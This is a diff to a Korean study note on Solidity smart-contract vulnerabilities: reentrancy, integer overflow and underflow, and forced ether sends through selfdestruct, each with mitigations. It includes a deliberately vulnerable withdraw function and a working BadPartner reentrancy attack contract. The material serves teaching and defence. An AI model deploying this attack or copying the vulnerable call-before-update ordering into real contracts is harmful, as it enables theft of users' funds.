@@ -162,6 +162,8 @@ withdraw 패턴을 사용하여 해결 가능하다.(추가적으로 transfer �
 
 - ![1](./7.2.1.png)
 
+// 문서 [참고](https://solidity-kr.readthedocs.io/ko/latest/common-patterns.html?highlight=transfer#withdrawal-pattern)
+
 ```
 function withdraw(uint child) public {
    require(msg.sender == partners[child]);
@@ -170,7 +172,116 @@ function withdraw(uint child) public {
 
    require(allocation > withdrawnSoFar);
    uint amount = allocation - withdrawnSoFar;
+   // 업데이후에 transfer을 호출한다.
    withdrawn[child] = allocation;
    msg.sender.transfer(amount);
 }
 ```
+
+마지막으로는 call 메소드를 사용할 때의 취약점이다.
+call 메소드는 value와 gas modifier를 받을 수 있는데, gas를 지정하지 않으면 현재의 모든 gas가 넘겨지게 된다. 외부의 메소드가 어떤 작업을 할지 알수없기 때문에 위험할 수 있다.
+
+앞서 예제에서 transfer대신에 call을 사용한다고 가정한다. (보낸 후에 값을 업데이트 하는 예제, 참고 문서 [링크](https://solidity-kr.readthedocs.io/ko/latest/security-considerations.html?highlight=call%20transfer))
+
+check-effects-interactions 패턴
+
+```
+function withdraw(uint child) public {
+   require(msg.sender == partners[child]);
+   uint withdrawnSoFar = withdrawn[child];
+   uint allocation = totalFunding / distribution[child];
+
+   require(allocation > withdrawnSoFar);
+   uint amount = allocation - withdrawnSoFar;
+
+   // call을 먼저 한 후에 값을 업데이트 한다.(권장하지 않음)
+   msg.sender.call.value(amount)();
+   withdrawn[child] = allocation;
+}
+```
+
+앞의 예제를 공격할 컨트렉트를 만든다.
+
+```
+pragma solidity ^0.4.22;
+
+import "./TrustFund3.sol";
+
+contract BadPartner {
+   TrustFund public fund;
+
+   constructor(address fundAddress) public {
+      fund = TrustFund(fundAddress);
+   }
+
+   function attack() public payable {
+      fund.withdraw(1);
+   }
+
+   function () public payable {
+      fund.withdraw(1);
+   }
+
+   function getBalance() public view returns(uint) {
+      return address(this).balance;
+   }
+}
+```
+
+공격자가 BadPartner의 attack을 호출하면 withdraw(1)을 호출하게 되고
+msg.sender.call.value(amount)();에서 다시 BadPartner의 fallback을 실행해 withdraw(1)을 호출하게 되고
+이 과정을 gas가 0이 될때까지 반복한다.
+
+"컴파일러가 경고하는 것을 무시하지 말라"
+
+transfer로 만약 대체한다면 단지 2300 gas를 보내고 끝나기 때문에 계속해서 contract가 불리는 현상을 막을 수 있다.
+
+Remix IDE의 analysis를 통해서 잠재적인 보안 이슈를 해결하는 것도 좋다.
+
+## Issues with Integers
+
+solidity 에서는 integer 값에 대해서 overflow나 underflow 체크를 해주지 않고 overflow가 발생하면 가장 작은 값으로 underflow가 발생하면 가장 큰 값으로 바뀌어 버리기 때문에 주의가 필요하다.
+
+예를 들어서 8bit unsigned integer (0-255, unsigned char)에 5-10을 하면 251이 나온다.
+
+이를 방지하기 위해서 assert를 사용해서 정해진 범위를 넘었는지 예외처리를 진행한다.
+
+- ![1](./7.2.3.png)
+
+한 address에서 다른 address로 token 100개를 전달하는 예제를 통해서 취약점을 알아보겠다.
+
+- ![1](./7.2.4.png)
+
+위의 예제에서 amount가 balances에 있는 금액보다 크게되면 underflow가 발생하게 되고 9번째 줄에서 sender에게 엄청나게 큰 토큰이 주어지게 된다.
+
+- ![1](./7.2.5.png)
+
+따라서 충분한 금액이 있는지 먼저 확인하고(underflow 방지 체크), overflow 방지 체크가 필요하다.
+
+- ![1](./7.2.6.png)
+
+연산마다 체크하기는 번거로우므로 보통 OpenZeppelin의 safemath를 사용한다.(원리가뭘까? 사용한다고 코드 수가 줄지는 않는듯...?)
+
+## 강제로 컨트렉트에 이더 보내기
+
+- ![1](./7.2.7.png)
+
+위의 예제의 Token contract는 fallback 메소드가 없고 deposit 메소드만 payable로 선언되어 있기 때문에 이 메소드를 통해서만 이더를 보낼 수 있다. 따라서 14번째 줄의 assert는 당연해 보인다.
+
+msg.sender: will be the person who's currently connecting with the contract.
+msg.value: number of wei sent with the message
+address(this).balance: Address 의 잔액(Wei 단위, 모든 거래의 금액(msg.value) 합산)
+
+하지만 실제로 이 contract에 이더를 보내는 방법이 하나 더 있다. 따라서 14번째 줄의 assert가 실패하고 더 이상 누구도 deposit 할 수 없는 상황이 될 수 있다.
+
+- ![1](./7.2.8.png)
+
+위의 SelfDestructable contract를 타겟을 Token contract로 하고 호출하면 SelfDestructable 컨트랙드의 남은 이더가 token contract로 보내지게 된다.
+
+이 때 "contract의 balance가 증가하게 된다."
+
+이를 방지하기 위해서는 balance에 의존하지 말고 변수를 하나 만들어서 balance처럼 작동하도록 만들어야 된다.
+
+- ![1](./7.2.9.png)
+
+위와 비슷한 내용의 블로그 [참고](https://hackernoon.com/how-to-hack-smart-contracts-self-destruct-and-solidity)
